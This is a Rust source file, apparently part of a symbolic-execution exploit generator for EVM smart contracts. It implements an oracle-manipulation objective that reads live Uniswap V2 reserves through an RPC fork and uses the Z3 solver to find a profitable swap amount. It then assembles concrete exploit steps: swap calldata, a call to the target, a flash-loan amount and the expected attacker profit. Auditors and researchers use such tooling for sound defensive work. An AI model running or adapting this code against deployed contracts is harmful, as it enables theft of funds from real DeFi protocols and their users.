use super::objectives::{run_with_z3_solver, ExploitObjective, ExploitParams, ExploitStep};
use crate::symbolic::state::{OracleType, SymbolicMachine};
use crate::symbolic::z3_ext::u256_from_bv;
use revm::primitives::{Address, Bytes, TransactTo, U256};
use revm::Database;
use revm::Evm;
use z3::ast::{Bool, BV};

pub struct OracleManipulationObjective {
    pub rpc_url: String,
    pub chain_id: u64,
    pub min_profit: U256,
}

impl ExploitObjective for OracleManipulationObjective {
    fn name(&self) -> &str {
        "Oracle Manipulation (Flash Loan + Price Shift)"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        run_with_z3_solver(|ctx, solver| {
            let attacker = crate::solver::setup::ATTACKER;
            let contract_addr = crate::solver::setup::TARGET;
            let rpc_url = self.rpc_url.clone();

            // 1. Initial Scan to find Oracle Dependencies
            let mut machine = SymbolicMachine::new(ctx, solver, Some(rpc_url.clone()));
            machine.seed_oracle(attacker, Some(contract_addr));

            let mut db =
                crate::solver::setup::StandardScenario::lightweight_db(&rpc_url, bytecode).ok()?;

            // Run a preliminary execution to discover dependencies
            // (We could also do this recursively, but let's start simple)
            {
                let mut evm = Evm::builder()
                    .with_db(&mut db)
                    .with_external_context(&mut machine)
                    .append_handler_register(revm::inspector_handle_register)
                    .modify_tx_env(|tx| {
                        tx.caller = attacker;
                        tx.transact_to = TransactTo::Call(contract_addr);
                        tx.data = Bytes::new(); // Try fallback/default
                    })
                    .build();
                let _ = evm.transact_commit();
            }

            // 2. If UniV2 dependency found, try to manipulate reserves
            let uni_v2_deps: Vec<_> = machine
                .oracle_deps
                .iter()
                .filter(|d| d.kind == OracleType::UniV2Reserves)
                .cloned()
                .collect();

            if uni_v2_deps.is_empty() {
                return None;
            }

            for dep in uni_v2_deps {
                solver.push();

                // 3. FETCH CONCRETE RESERVES (The "Real World" State)
                // We need the actual reserves from the fork DB to know the starting point.
                // dep.slot is the storage slot where reserves are packed (usually slot 8 for UniV2)
                let reserve_data = match db.storage(dep.source, dep.slot) {
                    Ok(val) => val,
                    Err(_) => {
                        solver.pop(1);
                        continue;
                    }
                };

                // Unpack reserves (assuming standard UniV2 packing: | blockTimestampLast (32) | reserve1 (112) | reserve0 (112) |)
                let reserve_data_bv = crate::symbolic::z3_ext::bv_from_u256(ctx, reserve_data);
                let r0_concrete = reserve_data_bv.extract(111, 0).zero_ext(144);
                let r1_concrete = reserve_data_bv.extract(223, 112).zero_ext(144);

                // 4. MODEL THE ATTACK: "I swap X amount to move the price"
                // Instead of picking the *result* (reserves), we pick the *action* (swap amount).
                let amount_in = BV::new_const(ctx, "manip_amount_in", 256);

                // Constraint: We must have the money to perform this swap.
                // For now, assume a generous cap or link to flash loan variable if available.
                // "amount_in > 0"
                solver.assert(&amount_in.bvugt(&BV::from_u64(ctx, 0, 256)));

                // CONSTANT PRODUCT FORMULA: Calculate New Reserves
                // Direction A: Swap Token0 -> Token1
                let amount_out_a = crate::protocols::uniswap_v2::get_amount_out(
                    &amount_in,
                    &r0_concrete,
                    &r1_concrete,
                );
                let r0_new_a = r0_concrete.bvadd(&amount_in);
                let r1_new_a = r1_concrete.bvsub(&amount_out_a);

                // OVERFLOW GUARD: r0 + amount_in must not wrap (models SafeMath revert).
                // Without this, amount_in > 2^256 - r0 wraps r0_new to near-zero,
                // violating the K-invariant and producing false positive exploits.
                // Same guard pattern as objectives.rs:206-210 and oracle_manipulation.rs:123.
                solver.assert(&r0_new_a.bvuge(&r0_concrete));

                let r0_new = r0_new_a;
                let r1_new = r1_new_a;

                machine
                    .manipulated_reserves
                    .insert(dep.source, (r0_new.clone(), r1_new.clone()));

                let final_balance = {
                    let mut evm = Evm::builder()
                        .with_db(&mut db)
                        .with_external_context(&mut machine)
                        .append_handler_register(revm::inspector_handle_register)
                        .modify_tx_env(|tx| {
                            tx.caller = attacker;
                            tx.transact_to = TransactTo::Call(contract_addr);
                            tx.data = Bytes::new();
                        })
                        .build();

                    let _result = evm.transact_commit();
                    evm.context
                        .external
                        .balance_overrides
                        .get(&attacker)
                        .cloned()
                }
                .unwrap_or(BV::from_u64(ctx, 0, 256));

                // Success Condition: The caller (attacker) gained balance
                // OR we triggered a profit condition in the machine
                // Success Condition: The caller (attacker) gained balance
                // OR we triggered a profit condition in the machine
                let profit_threshold = crate::symbolic::z3_ext::bv_from_u256(ctx, self.min_profit);

                // COST CHECK: Profit > Cost (amount_in) + Threshold
                // final_balance > amount_in + min_profit
                // OVERFLOW GUARD: Reject wrap-around (same pattern as objectives.rs:206-210)
                let sum = amount_in.bvadd(&profit_threshold);
                let no_overflow = sum.bvuge(&amount_in);
                let profit_check = final_balance.bvugt(&sum);
                solver.assert(&Bool::and(ctx, &[&profit_check, &no_overflow]));

                if solver.check() == z3::SatResult::Sat {
                    let model = solver.get_model()?;
                    let _amount_in_val = model
                        .eval(&amount_in, true)
                        .and_then(|v| u256_from_bv(&v))
                        .unwrap_or(U256::ZERO);
                    let _amount_out_val = model
                        .eval(&amount_out_a, true)
                        .and_then(|v| u256_from_bv(&v))
                        .unwrap_or(U256::ZERO);

                    // Construct exploit steps
                    // Step 1: Manipulation (Swap on UniV2)
                    // selector for swap(uint,uint,address,bytes): 0x022c0d9f
                    let mut swap_data = vec![0x02, 0x2c, 0x0d, 0x9f];
                    swap_data.extend_from_slice(&U256::ZERO.to_be_bytes::<32>()); // amount0Out
                    swap_data.extend_from_slice(&_amount_out_val.to_be_bytes::<32>()); // amount1Out
                    swap_data.extend_from_slice(&attacker.into_word().0); // to
                    swap_data.extend_from_slice(&U256::ZERO.to_be_bytes::<32>()); // bytes (empty)

                    let step1 = ExploitStep {
                        target: dep.source,
                        call_data: Bytes::from(swap_data),
                        execute_if: None,
                    };

                    let step2 = ExploitStep {
                        target: contract_addr,
                        call_data: Bytes::new(),
                        execute_if: None,
                    };

                    let _start_bal = model
                        .eval(&amount_in, true)
                        .and_then(|v| u256_from_bv(&v))
                        .unwrap_or(U256::ZERO);
                    let _final_bal = model
                        .eval(&final_balance, true)
                        .and_then(|v| u256_from_bv(&v))
                        .unwrap_or(U256::ZERO);
                    let _profit = _final_bal.saturating_sub(_amount_in_val);

                    solver.pop(1);
                    return Some(ExploitParams {
                        flash_loan_amount: _amount_in_val, // Needs to borrow the capital!
                        flash_loan_token: Address::ZERO,
                        flash_loan_provider: Address::ZERO,
                        flash_loan_legs: Vec::new(),
                        steps: vec![step1, step2],
                        expected_profit: Some(_profit),
                        block_offsets: None,
                    });
                }

                solver.pop(1);
            }

            None
        })
    }
}
